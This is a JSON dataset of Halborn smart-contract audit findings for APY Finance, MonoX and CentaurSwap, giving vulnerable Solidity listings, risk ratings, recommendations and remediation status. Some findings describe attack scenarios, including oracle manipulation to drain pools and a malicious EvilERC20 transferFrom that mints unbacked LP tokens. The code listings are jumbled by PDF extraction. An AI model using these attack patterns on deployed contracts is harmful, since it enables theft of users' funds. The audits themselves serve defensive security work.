Code location: Listing 4: OracleAdapter.sol 125 function unlock () external override onlyPermissioned { 126 127 } lockFor (0) ; Risk Level: Likelihood - 4 Impact - 4 S R O T C A F K S I R D E S A B L A N R E T N I 34 Recommendations: Security measures to reduce risk level for this finding:  Add a mutex for unlock function. As a reference, you can use a mutex based on roundId value returned by TVL aggregator, so nobody can unlock OracleAdapter while roundId has not been incremented with respect to its previous value (before locking). This locking could be reverted on emergency situations using lockFor function.  For an adequate segregation of duties, create an emergency role (multisig wallet) to unlock OracleAdapter on emergency situations. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe).  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. S R O T C A F K S I R D E S A B L A N R E T N I Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. The unlock function from OracleAdapter contract was removed to avoid too early manual unlocking and lockFor function is protected by onlyContrac- tRole modifier. On the other hand, the emergencyUnlock function that can unlock contract immediately (in case of emergency) is protected by onlyEmergencyRole modifier. 35 ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: High"]}, {"title": "LOSS OF TOKENS WHEN TRANSACTS WITH SMALL QUANTITIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "When a user calls addLiquidity function from PoolTokenV2 with a small quantity of stable coins (DAI / USDC / USDT), the internal function that calculates the APT tokens to be minted rounds-off the result to zero. So, the stable coins are added to its corresponding pool but no APT token is minted for the user and generates a very slight imbalance on stable coin / APT ratio. If this issue repeats enough times, the imbalance could lead to APT tokens being mispriced, allowing users to deposit or withdraw more or less than their fair share. A similar situation occurs when a user calls redeem function from PoolTo- kenV2 with a small quantity of APT tokens. Category: Code vulnerabilities and bounds checks Code location: Listing 5: PoolTokenV2.sol (Lines 237) external virtual override nonReentrant whenNotPaused 217 function addLiquidity ( uint256 depositAmount ) 218 219 220 221 222 223 224 225 226 { require (! addLiquidityLock , \" LOCKED \" ); require ( depositAmount > 0, \" AMOUNT_INSUFFICIENT \" ); require ( 36 S R O T C A F K S I R D E S A B L A N R E T N I 227 228 229 230 231 232 233 234 235 236 237 238 239 240 underlyer . allowance ( msg . sender , address ( this )) >= depositAmount , \" ALLOWANCE_INSUFFICIENT \" ); // solhint - disable - next - line not - rely - on - time lastDepositTime [ msg . sender ] = block . timestamp ; // calculateMintAmount () is not used because deposit value // is needed for the event uint256 depositValue = getValueFromUnderlyerAmount ( depositAmount ); uint256 poolTotalValue = getPoolTotalValue () ; uint256 mintAmount = _calculateMintAmount ( depositValue , poolTotalValue ); _mint ( msg . sender , mintAmount ); underlyer . safeTransferFrom ( msg . sender , address ( this ) , depositAmount ); Listing 6: PoolTokenV2.sol (Lines 280) external virtual override nonReentrant whenNotPaused 269 function redeem ( uint256 aptAmount ) 270 271 272 273 274 275 276 277 278 { require (! redeemLock , \" LOCKED \" ); require ( aptAmount > 0, \" AMOUNT_INSUFFICIENT \"); require ( aptAmount <= balanceOf ( msg . sender ) , \" 279 280 281 282 283 284 285 286 287 BALANCE_INSUFFICIENT \" ); uint256 redeemUnderlyerAmt = getUnderlyerAmountWithFee ( aptAmount ); require ( redeemUnderlyerAmt <= underlyer . balanceOf ( address ( this )) , \" RESERVE_INSUFFICIENT \" ); _burn ( msg . sender , aptAmount ); underlyer . safeTransfer ( msg . sender , redeemUnderlyerAmt ); 37 S R O T C A F K S I R D E S A B L A N R E T N I Risk Level: Likelihood - 3 Impact - 1 Recommendations: Add a require function just after calculating APT tokens to be minted (when adding liquidity) or stable coins to be returned (when redeeming). Revert the operation if the result is not greater than zero. Remediation plan: SOLVED: After further review, APY.Finance team concluded that there was no way to slowly drain funds from the pool for other users. It could only be used to slowly lose funds for the attacker by depositing tiny amounts and receiving no APT tokens, or redeeming tiny amounts of APT and receiving no funds for it. Because the additional gas cost of implementing verification exceeded the expected loss to a user from improper use of the feature during normal operation, APY.Finance team decided that it was in the best interest of the user base not to include the verification smart contracts. Instead, what they have done is prevent tiny amounts (< 0.01)from being deposited or redeemed in the front-end UI. In this way, one user cannot accidentally lose a small amount of funds and other users are not affected by the rising cost of gas. 38 S R O T C A F K S I R D E S A B L A N R E T N I ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Low"]}, {"title": "INSUFFICIENT PROTECTION FOR ORACLE ADAPTER COULD LEAD TO TVL / PRICE MANIPULATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "Currently, the following critical functions on OracleAdapter contract are protected by onlyOwner modifier:  Set TVL value: setTvl  Set TVL aggregator source: setTvlSource  Set asset aggregator sources: setAssetSources, setAssetSource If private key of contract owner is compromised, an attacker could manipulate TVL or prices to create a great imbalance on stable coin / APT ratio and withdraw much more than allowed. Attack scenario: A step-by-step attack scenario will be described along with screenshots extracted from proof of concept (PoC) script, which is included on security-assessment/fake_tvl.js file as an attachment for this report. The smart contract called FakeAggregator.sol, which is used for this security test, is also included as an attachment. 1. Attacker deposits its stable coins into a pool. 39 S R O T C A F K S I R D E S A B L A N R E T N I 2. On the other side, attacker deploys a fake TVL aggregator, which return value can be manipulated anytime by him. 3. Attacker defines the desired value to be returned by fake TVL aggregator. 4. If attacker compromises the private key of OracleAdapter owner, he is able to modify the TVL source to point to fake TVL aggregator previously deployed. 5. Once exploit is launched, we can see that attacker deposited 1M DAI but is able to withdraw more than 5M DAI, which represents a 418% excedent. 40 S R O T C A F K S I R D E S A B L A N R E T N I Category: Access control or ownership risks Code location: Functions to set TVL value and TVL aggregator source respectively: Listing 7: OracleAdapter.sol 156 157 158 159 160 161 162 163 164 function setTvl ( uint256 value , uint256 period ) external override locked onlyOwner { } // We do allow 0 values for submitted values submittedTvlValue = Value ( value , block . number . add ( period )) ; Listing 8: OracleAdapter.sol 174 175 176 177 178 function setTvlSource ( address source ) public onlyOwner { require ( source . isContract () , \" INVALID_SOURCE \" ); tvlSource = AggregatorV3Interface ( source ); emit TvlSourceUpdated ( source ); } S R O T C A F K S I R D E S A B L A N R E T N I 41 Functions to set asset aggregator sources: Listing 9: OracleAdapter.sol 185 function setAssetSources ( address [] memory assets , address [] memory 186 187 188 189 190 191 192 193 sources ) public onlyOwner { } require ( assets . length == sources . length , \" INCONSISTENT_PARAMS_LENGTH \" ); for ( uint256 i = 0; i < assets . length ; i ++) { setAssetSource ( assets [ i ], sources [ i ]) ; } Listing 10: OracleAdapter.sol 200 function setAssetSource ( address asset , address source ) public onlyOwner { require ( source . isContract () , \" INVALID_SOURCE \" ); assetSources [ asset ] = AggregatorV3Interface ( source ); emit AssetSourceUpdated ( asset , source ); 201 202 203 204 } Risk Level: Likelihood - 1 Impact - 5 Recommendations: Security measures to reduce risk level for this finding:  For an adequate segregation of duties, create an emergency role (multisig wallet) to manage critical functions on OracleAdapter. This role must be different from the one used for day-to-day operations (e.g.: fund LP Safe). 42 S R O T C A F K S I R D E S A B L A N R E T N I  Configure this multisig wallet to have a reasonable number of owners and an appropriate number of required confirmations to transact. Remediation plan: SOLVED: Issue fixed in commit 8d4f1d4c4069ced8462ee95ec36d6ef9e12033e0. APY.Finance team defined the onlyEmergencyRole modifier to restrict access to aforementioned functions to the emergency role (multisig wallet). S R O T C A F K S I R D E S A B L A N R E T N I 43 EXTERNAL BASED RISK FACTORS 44 ", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Medium"]}, {"title": "LACK OF INTERNAL MECHANISMS TO DETECT ABNORMAL VALUES FROM ORACLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/APY_Financial_Pentesting_Report_Halborn_Final.pdf", "body": "The functions on OracleAdapter contract that get the TVL and asset price values from oracles (getTvl and getAssetPrice respectively) do not include previous validations to verify if received answer is abnormal or has been severely manipulated. Attack scenario: 1. Attacker deposits its stable coins into a pool. 2. If TVL aggregator is compromised (external attacks or internal fraud), attacker is able to modify the oracles it feeds from to fake ones that inflate the actual TVL value. 3. Attacker and legitimate users as well are able to withdraw much more stable coins than allowed. Category: Oracle attacks Code location: Listing 11: OracleAdapter.sol (Lines 231) 227 function getTvl () external view override unlocked returns ( uint256 ) { } 228 229 230 231 232 if ( block . number < submittedTvlValue . periodEnd ) { return submittedTvlValue . value ; } return _getPriceFromSource ( tvlSource ); 45 S R O T C A F K S I R D E S A B L A N R E T X E Listing 12: OracleAdapter.sol (Lines 250) 239 function getAssetPrice ( address asset ) 240 241 242 243 244 245 246 public view override unlocked returns ( uint256 ) { if ( block . number < submittedAssetValues [ asset ]. periodEnd ) { return submittedAssetValues [ asset ]. value ; } AggregatorV3Interface source = assetSources [ asset ]; return _getPriceFromSource ( source ); 247 248 249 250 251 } Risk Level: Likelihood - 1 Impact - 5 Recommendations: Calculate TVL value on-chain each time an asset allocation is added or removed. If not possible due to technical restrictions / excessive gas consumption, it is advisable to adopt the following security measures to reduce risk level for this finding:  Each time getAssetPrice is called, store the latest answer on contract. If a new answer received from price aggregator deviates more than a predefined threshold (e.g: 10%), use instead the latest stored value on contract or fallback to a backup price aggregator.  Monitor event ConfigSet to detect timely if there has been logic or oracle (also called transmitters) updates. For this task is possible to integrate OpenZeppelin Defender platform. With Defender, Sentinels are used OffchainAggregator contract from 46 S R O T C A F K S I R D E S A B L A N R E T X E to automatically monitor and respond to events, functions, and transaction parameters on smart contracts. Also with full Autotask integration, it is feasible to add circuit breakers or automated actions, so APY.Finance team can receive notifications via email, Slack, Telegram or Discord.  Because of min-max TVL values have been set immutably during Of- fchainAggregator contract deployment, it is advisable to revert operations that could make TVL value be outside the min-max range. It is also possible to ask Chainlink team to upgrade the logic of the contract if necessary. Remediation plan: SOLVED: APY.Finance team examined different ways of detecting abnormal oracle values, the most important of which was proper detection of zero values. Zero values require special attention because when a Chainlink However, there are aggregator fails, it could return a zero value. certain valid states of the system in which the TVL can also be zero, such as before the initial deployment of liquidity, or if all liquidity is unwound to deploy a new LP account contract. To distinguish between valid and invalid zero values, the getTvl function of the OracleAdapter contract checks the totalSupply of mAPT. When the totalSupply of mAPT is zero, either the liquidity has not been transferred from the LP Account from the pools or all liquidity from the LP Account has been moved back to the pools. A combination of zero mAPT totalSupply and zero TVL indicates a valid zero value. If the totalSupply of mAPT is greater than zero and the oracle still reads a zero TVL, the value should indicate a failure state, and the operation is reverted. Finally, APY.Finance team decided to detect skew with off-chain monitoring of events that can be responded to using OpenZeppelin Defender. 47 S R O T C A F K S I R D E S A B L A N R E T X E THANK YOU FOR CHOOSING", "labels": ["Halborn", "APY_Financial_Pentesting", "Severity: Medium"]}, {"title": "UNRESTRICTED POOL TOKEN MINTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "One of MonoXs main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. In order to keep track of users shares in pools, a corresponding amount of liquidity pool tokens is minted to providers. The exact amount to be minted depends on e.g. the declared amount of ERC20 tokens added to the pool and the token price, intially set by the provider. use the token function the MonoX transfer. addLiquidityPair handle to OpenZeppelins In function This safeTransferFrom calls transferFrom in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Attacker-controlled example ERC20 token contract Listing 1: EvilERC20.sol (Lines 10) ) 1 function transferFrom ( address from , 2 address to , 3 4 uint256 value 5 6 7 8 9 10 public override returns ( bool ) value = 1; { 13 require ( value <= _balances [ from ]) ; require ( value <= _allowed [ from ][ msg . sender ]) ; require ( to != address (0) ) ; _balances [ from ] = _balances [ from ]. sub ( value ); _balances [ to ] = _balances [ to ]. add ( value ); _allowed [ from ][ msg . sender ] = _allowed [ from ][ msg . sender ]. sub ( value ); emit Transfer ( from , to , value ); return true ; } 11 12 13 14 15 16 17 18 19 20 MonoX Listing 2: Monoswap.sol (Lines 235,236) 231 function listNewToken ( address _token , uint112 _price , 232 233 234 235 236 uint256 vusdAmount , uint256 tokenAmount , address to ) public returns ( uint _pid , uint256 liquidity ) { _pid = _createPool ( _token , _price , PoolStatus . LISTED ); liquidity = addLiquidityPair ( _token , vusdAmount , tokenAmount , to ); 237 } Listing 3: Monoswap.sol (Lines 253,258,261,164,267) 251 252 253 254 255 256 257 258 259 260 261 262 _mintFee ( pool . pid , pool . lastPoolValue , poolValue ); uint256 _totalSupply = monoXPool . totalSupplyOf ( pool . pid ); IERC20 ( _token ). safeTransferFrom ( msg . sender , address ( monoXPool ) , tokenAmount ); if ( vusdAmount >0) { vUSD . safeTransferFrom ( msg . sender , address ( monoXPool ) , vusdAmount ); } uint256 liquidityVusdValue = vusdAmount . add ( tokenAmount . mul ( pool . price ) /1 e18 ); if ( _totalSupply ==0) { liquidity = liquidityVusdValue . sub ( MINIMUM_LIQUIDITY ); mint ( owner () , pool . pid , MINIMUM_LIQUIDITY ); // sorry , oz 14 doesn 't allow minting to address (0) } else { liquidity = _totalSupply . mul ( liquidityVusdValue ). div ( poolValue ); } mint ( to , pool . pid , liquidity ); 263 264 265 266 267 268 } OpenZeppelin Listing 4: SafeERC20.sol (Lines 24,25) using Address for address ; 17 library SafeERC20 { 18 19 20 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 21 22 23 24 25 26 Recommendation: Whenever tokens are transferred, the delta of the previous (before trans- fer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. The amount to be minted is calculated now based on the delta of account balance before and after transfer. 15 ", "labels": ["Halborn", "MonoX", "Severity: High"]}, {"title": "POOL BLOCKING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "One of MonoXs main objectives is to allow users for listing ERC20 tokens without the need for providing liquidity. Users can set arbitrary prices for tokens they list because the Monoswap.sol contract does not verify them against third-party data sources. The price of a given token can be updated only if it has not been swapped for at least 6000 blocks since the last exchange. In consequence, since the contract does not enforce minimum or maximum transaction amount, a malicious user can list tokens, price them way above market rate and keep the price on that level by doing microexchanges once every 6000 blocks thus effectively DoSing the pool. Code Location: Listing 5: Monoswap.sol (Lines 235) 231 function listNewToken ( address _token , uint112 _price , 232 233 234 235 236 uint256 vusdAmount , uint256 tokenAmount , address to ) public returns ( uint _pid , uint256 liquidity ) { _pid = _createPool ( _token , _price , PoolStatus . LISTED ); liquidity = addLiquidityPair ( _token , vusdAmount , tokenAmount , to ); 237 } Listing 6: Monoswap.sol (Lines 189,196) 177 function _createPool ( address _token , uint112 _price , PoolStatus _status ) lock internal returns ( uint256 _pid ) require ( tokenPoolStatus [ _token ]==0 , \" Monoswap : Token Exists \"); require ( _token != address ( vUSD ) , \" Monoswap : vUSD pool not { allowed \" ); _pid = poolSize ; pools [ _token ] = PoolInfo ({ token : _token , pid : _pid , 178 179 180 181 182 183 16 184 185 186 187 188 189 190 191 192 193 194 195 196 197 } vusdCredit : 0, vusdDebt : 0, tokenBalance : 0 , lastPoolValue : 0, status : _status , price : _price }) ; poolSize = _pid . add (1) ; tokenPoolStatus [ _token ]=1; // initialze pool 's lasttradingblocknumber as the block number on which the pool is created lastTradedBlock [ _token ] = block . number ; Listing 7: Monoswap.sol (Lines 463) 454 function swapExactTokenForToken ( 455 456 457 458 459 460 461 462 address tokenIn , address tokenOut , uint amountIn , uint amountOutMin , address to , uint deadline ) external virtual ensure ( deadline ) returns ( uint amountOut ) { amountOut = swapIn ( tokenIn , tokenOut , msg . sender , to , amountIn ); 463 require ( amountOut >= amountOutMin , ' Monoswap : INSUFFICIENT_OUTPUT_AMOUNT '); 464 } Listing 8: Monoswap.sol (Lines 561) 560 561 // record last trade 's block number in mapping : lastTradedBlock lastTradedBlock [ _token ] = block . number ; Listing 9: Monoswap.sol (Lines 163) 156 function updatePoolPrice ( address _token , uint112 _newPrice ) public onlyOwner { 17 157 158 159 160 161 162 163 164 165 166 } require ( _newPrice > 0, ' Monoswap : zeroPriceNotAccept '); require ( tokenPoolStatus [ _token ] != 0, \" Monoswap : PoolNotExist \" ); PoolInfo storage pool = pools [ _token ]; require ( pool . price != _newPrice , \" Monoswap : SamePriceNotAccept \"); require ( block . number > lastTradedBlock [ _token ]. add (6000) , \" Monoswap : PoolPriceUpdateLocked \"); pool . price = _newPrice ; lastTradedBlock [ _token ] = block . number ; Recommendation: If possible, its recommended to validate tokens prices (by the use of oracles) on initial listing and on every subsequent price change in order not to allow for manipulating the exchange by malicious users. Additionally, a minimum/maximum input/output amount of tokens could be enforced. Reference: Chainlink Price Oracle Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Con- tract owner can now pause pools and temporarily disable swapping so that users with the PriceAdjuster role (assigned by the contract owner) can update prices. 18 ", "labels": ["Halborn", "MonoX", "Severity: High"]}, {"title": "ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. Code Location: Listing 10: Monoswap.sol (Lines 130,134,139,145,156) feeTo = _feeTo ; require ( _fees <1 e3 , \" fees too large \" ); fees = _fees ; 130 function setFeeTo ( address _feeTo ) onlyOwner external { 131 132 } 133 134 function setFees ( uint16 _fees ) onlyOwner external { 135 136 137 } 138 139 function setDevFee ( uint16 _devFee ) onlyOwner external { 140 141 142 } 143 144 // update status of a pool . onlyOwner . 145 function updatePoolStatus ( address _token , PoolStatus _status ) require ( _devFee <1 e3 , \" devFee too large \" ); devFee = _devFee ; public onlyOwner { 19 PoolInfo storage pool = pools [ _token ]; pool . status = _status ; 146 147 148 } 149 150 /* * 151 @dev update pools price if there were no active trading for the last 6000 blocks 152 @notice Only owner callable , new price can neither be 0 nor be equal to old one @param _token pool identifider ( token address ) @param _newPrice new price in wei ( uint112 ) 153 154 155 */ 156 function updatePoolPrice ( address _token , uint112 _newPrice ) public 157 onlyOwner { require ( _newPrice > 0, ' Monoswap : zeroPriceNotAccept '); Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. Reference: Least Privilege Principle Remediation Plan: SOLVED: Fixed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. Sev- eral new roles were introduced. 20 ", "labels": ["Halborn", "MonoX", "Severity: High"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance, in Monoswap.sol, the getAmountOut method is subtracting fees from a fixed number and may end up overflowing the integer since the resulting value is not checked to be greater or equal 0. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 11: Monoswap.sol (Lines 638) 633 function getAmountOut ( address tokenIn , address tokenOut , 634 uint256 amountIn ) public view returns ( uint256 tokenInPrice , 635 636 637 638 639 uint256 tokenOutPrice , uint256 amountOut , uint256 tradeVusdValue ) { require ( amountIn > 0, ' Monoswap : INSUFFICIENT_INPUT_AMOUNT '); uint256 amountInWithFee = amountIn . mul (1 e5 - fees ) /1 e5 ; address vusdAddress = address ( vUSD ); Listing 12: Monoswap.sol (Lines 584) 579 function getAmountIn ( address tokenIn , address tokenOut , 580 uint256 amountOut ) public view returns ( uint256 tokenInPrice , 581 582 583 584 585 uint256 tokenOutPrice , uint256 amountIn , uint256 tradeVusdValue ) { require ( amountOut > 0, ' Monoswap : INSUFFICIENT_INPUT_AMOUNT '); uint256 amountOutWithFee = amountOut . mul (1 e5 + fees ) /1 e5 ; address vusdAddress = address ( vUSD ); 21 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: SOLVED: MonoX is certain the integers reported will not overflow since the fees variable cannot be assigned value greater than 1e3. 22 ", "labels": ["Halborn", "MonoX", "Severity: Medium"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In on Calls inside a loop might lead to a denial-of-service attack. of the functions discovered there is a for loop on variable pid that iterates up to the poolInfo array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 13: MonoswapStaking.sol (Lines 241) uint256 length = poolInfo . length ; for ( uint256 pid = 0; pid < length ; ++ pid ) { 236 function massUpdatePools () public { 237 238 239 240 241 242 243 } updatePool ( pid ); } PoolInfo storage pool = poolInfo [ pid ]; if ( pool . bActive ) Recommendation: If possible, use pull over push strategy for external calls. Remediation Plan: SOLVED: MonoX is certain the DoS scenario is highly unlikely here since all external calls in this loop are made to MonoX-controlled contracts. 23 ", "labels": ["Halborn", "MonoX", "Severity: Low"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Solidity integer division might truncate. As a result, performing mul- tiplication before division can sometimes avoid loss of precision. In this audit, there are multiple instances found where division is being performed before multiplication operation in contract file. Code Location: Listing 14: MonoswapStaking.sol (Lines 221) 220 if ( user . oldReward > 0) { 221 monoReward = monoReward . add ( user . oldReward . mul ( stakedAmount ). div ( user . amount ). mul (1 e12 )) ; 222 } Recommendation: Consider doing multiplication operation before division to prevail pre- cision in the values in non floating data type. Remediation Plan: SOLVED: fixed in commit #ac21bee3f7f1d7df3529907b0afb0470b0236d07 24 ", "labels": ["Halborn", "MonoX", "Severity: Low"]}, {"title": "ADDRESS VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Address validation is missing in multiple functions in contracts Monoswap .sol and MonoXPool.sol. This may result with users irreversibly locking their tokens when incorrect address is provided. Code Location: Listing 15: Monoswap.sol (Lines 169,173) 168 function mint ( address account , uint256 id , uint256 amount ) internal { monoXPool . mint ( account , id , amount ); 169 170 } 171 172 function burn ( address account , uint256 id , uint256 amount ) internal { monoXPool . burn ( account , id , amount ); 173 174 } Listing 16: MonoXPool.sol (Lines 20) 19 constructor ( address _WETH ) { 20 WETH = _WETH ; 21 } Listing 17: MonoXPool.sol (Lines 28,33) 26 function mint ( address account , uint256 id , uint256 amount ) public onlyOwner { totalSupply [ id ]= totalSupply [ id ]. add ( amount ); _mint ( account , id , amount , \" \"); 27 28 29 } 30 31 function burn ( address account , uint256 id , uint256 amount ) public onlyOwner { 25 totalSupply [ id ]= totalSupply [ id ]. sub ( amount ); _burn ( account , id , amount ); 32 33 34 } Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. Remediation Plan: PARTIALLY SOLVED: Vulnerable function calls in Monoswap.sol have been removed but address validation is missing in MonoXPool.sol. 26 ", "labels": ["Halborn", "MonoX", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: Listing 18: Monoswap.sol (Lines 86) 85 modifier ensure ( uint deadline ) { 86 87 88 } require ( deadline >= block . timestamp , ' Monoswap : EXPIRED '); _; Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: SOLVED: MonoX does not require timestamps to be extremely precise here (timescales are greater than 900 seconds) 27 ", "labels": ["Halborn", "MonoX", "Severity: Low"]}, {"title": "TAUTOLOGY EXPRESSIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MonoX_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "In contract Monoswap.sol, tautology expressions have been detected. Such expressions are of no use since they always evaluate true/false regardless of the context they are used in. Code Location: Listing 19: Monoswap.sol (Lines 546) 544 if ( _poolStatus == PoolStatus . LISTED ){ 545 546 require ( _vusdCredit >=0 && _vusdDebt ==0 , \" Monoswap : unofficial pool cannot bear debt \"); 547 } Recommendation: Correct the expressions. Since _vusdCredit variable is declared as type uint256, it is always greater or equal to 0. Remediation Plan: SOLVED: Tautology Expression was removed in commit #635a4cee2f2e50d854e06cac47c48aa0fafde2b0. 28 3.10 (HAL-10) POSSIBLE MISUSE OF PUBLIC FUNCTIONS - INFORMATIONAL ", "labels": ["Halborn", "MonoX", "Severity: Informational"]}, {"title": "UNDEFINED ROLE ON THE UNLOCK FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "In the CentaurFactoryTimeLock.sol contract, the timelock mechanism has However, this function is been implemented through unlock function. In the other hand, the authorized through EMERGENCY_MAINTAINER_ROLE. contract defined TIMELOCK_ADMIN_ROLE role. The TIMELOCK_ADMIN_ROLE role should be authorized by the function(unlock). Code Location: CentaurFactoryTimeLock.sol Line #49 Listing 1: CentaurFactoryTimeLock.sol (Lines 49) 49 50 51 52 function unlock () external onlyRole ( EMERGENCY_MAINTAINER_ROLE ) { PENDING_UNLOCK = true ; UNLOCK_TIMESTAMP = ( block . timestamp ). add ( TIMELOCK_PERIOD ); } Risk Level: Likelihood - 2 Impact - 3 Recommendation: The TIMELOCK_ADMIN_ROLE function should be modifier for the timelock function. 13 Listing 2: CentaurFactoryTimeLock.sol (Lines 49) 49 50 51 52 function unlock () external onlyRole ( TIMELOCK_ADMIN_ROLE ) { PENDING_UNLOCK = true ; UNLOCK_TIMESTAMP = ( block . timestamp ). add ( TIMELOCK_PERIOD ); } Remediation Plan: ACKNOWLEDGED: CentaurSwap Team claims that this is intended behaviour of the function. Only the EMERGENCY_MAINTAINER_ROLE can initiate unlock and emergency withdraw because it will be governed by a 6/6 Multisig. 14 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Low"]}, {"title": "REDUNDANT CODE IN THE CONDITION STATEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "The conditional statement on CentaurFactoryTimeLock.sol contains the code It is infeasible for msg.sender to ever hasRole(role, address(0)). Consider simplifying this to hasRole(role, be equal to address(0). _msgSender()). Code Location: CentaurFactoryTimeLock.sol Line #31 Listing 3: CentaurFactoryTimeLock.sol (Lines 31) 30 31 32 33 modifier onlyRole ( bytes32 role ) { require ( hasRole ( role , _msgSender () ) || hasRole ( role , address (0) ) , \" CentaurFactoryTimeLock : NO_PERMISSION \" ); _ ; } Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to delete hasRole(role, address(0)) conditional state- ment from the modifier. The sample solution can be seen below. Listing 4: CentaurFactoryTimeLock.sol (Lines 31) 30 modifier onlyRole ( bytes32 role ) { 15 31 32 33 require ( hasRole ( role , _msgSender () ) , \" CentaurFactoryTimeLock : NO_PERMISSION \" ); _ ; } Remediation Plan: SOLVED: Conditional statement was removed. The CentaurSwap Team updated the relevant contract. 16 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Low"]}, {"title": "LACK OF TIMELOCK SETTER FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "During the tests, It has been observed that TIMELOCK_PERIOD does not have any function for setting new timelock period. Code Location: Listing 5: CentaurFactoryTimeLock.sol (Lines 21) 21 uint public TIMELOCK_PERIOD = 1 days ; Recommendation: It is recommended to define function for setting new timelock period. Also, this function should have MAXIMUM_DELAY and MINIMUM_DELAY state- ments on the timelock. Remediation Plan: SOLVED: CentaurSwap Team declared TIMELOCK_PERIOD state variable as con- stant. They do not intend to modify the timelock period. 17 ", "labels": ["Halborn", "CentaurSwap_Timelock", "Severity: Low"]}, {"title": "MISSING EVENT HANDLER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CentaurSwap_Timelock_Smart_Contract_Security_Audit_v1_1.pdf", "body": "In the CentaurFactoryTimeLock contract, the functions do not emit event after the progress. Events are 